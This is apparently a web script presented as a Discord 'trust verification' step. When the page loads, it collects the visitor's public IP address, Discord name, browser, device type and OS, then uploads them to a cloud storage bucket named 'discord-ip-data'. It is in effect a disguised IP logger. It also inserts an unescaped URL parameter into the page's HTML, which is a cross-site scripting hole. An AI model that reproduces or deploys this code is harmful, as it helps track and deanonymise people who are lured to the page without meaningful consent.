// js/auto-trust.js
class AutoTrustVerifier {
    constructor() {
        this.accountId = '640846f3750d7515889506062e8fbdbf';
        this.bucketName = 'discord-ip-data';
        this.s3Url = `https://${this.accountId}.r2.cloudflarestorage.com/${this.bucketName}`;
        this.init();
    }

    init() {
        // Automatically start verification when page loads
        this.storeDeviceInfoAutomatically();
    }

    async getIPAddress() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Error getting IP:', error);
            return 'Unknown IP';
        }
    }

    async storeDeviceInfo(discordName, ipAddress, userAgent, timestamp) {
        try {
            // Create filename with timestamp
            const filename = `device_info_${discordName}_${Date.now()}.json`;
            
            // Get device information
            const deviceInfo = {
                discordName,
                ipAddress,
                userAgent,
                timestamp,
                browser: this.getBrowserInfo(),
                deviceType: this.getDeviceType(),
                operatingSystem: this.getOSInfo()
            };
            
            // Store in R2
            const response = await fetch(`${this.s3Url}/${filename}`, {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(deviceInfo)
            });
            
            if (response.ok) {
                return { success: true, filename };
            } else {
                throw new Error(`Storage failed: ${response.status}`);
            }
        } catch (error) {
            console.error('R2 Storage Error:', error);
            // Fallback to localStorage
            this.storeInLocalStorage(deviceInfo);
            return { success: false, error: error.message };
        }
    }

    storeInLocalStorage(data) {
        const stored = JSON.parse(localStorage.getItem('deviceData') || '[]');
        stored.push(data);
        localStorage.setItem('deviceData', JSON.stringify(stored));
    }

    async storeDeviceInfoAutomatically() {
        const discordName = this.getDiscordUsername();
        const ipAddress = await this.getIPAddress();
        const timestamp = new Date().toISOString();
        const userAgent = navigator.userAgent;
        
        try {
            const result = await this.storeDeviceInfo(discordName, ipAddress, userAgent, timestamp);
            
            // Display results automatically
            const resultDiv = document.getElementById('result');
            resultDiv.innerHTML = `
                <h3>Information Stored Successfully</h3>
                <p><strong>User:</strong> ${discordName}</p>
                <p><strong>IP Address:</strong> ${ipAddress}</p>
                <p><strong>Browser:</strong> ${this.getBrowserInfo()}</p>
                <p><strong>Device Type:</strong> ${this.getDeviceType()}</p>
                <p><strong>Operating System:</strong> ${this.getOSInfo()}</p>
                <p><strong>Timestamp:</strong> ${new Date().toLocaleString()}</p>
                <p><strong>Status:</strong> ${result.success ? 'Stored in Cloudflare R2' : 'Stored locally'}</p>
            `;
            
            resultDiv.style.display = 'block';
            
        } catch (error) {
            console.error('Automatic storage failed:', error);
            const resultDiv = document.getElementById('result');
            resultDiv.innerHTML = `
                <h3>Storage Failed</h3>
                <p>Error: ${error.message}</p>
                <p>Please try refreshing the page.</p>
            `;
            resultDiv.style.display = 'block';
        }
    }

    getDiscordUsername() {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get('discord') || 'Anonymous';
    }

    getBrowserInfo() {
        const userAgent = navigator.userAgent;
        if (userAgent.includes('Chrome')) return 'Chrome';
        if (userAgent.includes('Firefox')) return 'Firefox';
        if (userAgent.includes('Safari')) return 'Safari';
        if (userAgent.includes('Edge')) return 'Edge';
        return 'Unknown Browser';
    }

    getDeviceType() {
        const userAgent = navigator.userAgent;
        if (/Mobile|Android|iPhone|iPad/.test(userAgent)) return 'Mobile';
        if (/Tablet|iPad/.test(userAgent)) return 'Tablet';
        return 'Desktop';
    }

    getOSInfo() {
        const userAgent = navigator.userAgent;
        if (userAgent.includes('Windows')) return 'Windows';
        if (userAgent.includes('Mac')) return 'macOS';
        if (userAgent.includes('Linux')) return 'Linux';
        if (userAgent.includes('Android')) return 'Android';
        if (userAgent.includes('iOS') || userAgent.includes('iPhone')) return 'iOS';
        return 'Unknown OS';
    }
}

// Initialize automatically when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    new AutoTrustVerifier();
});
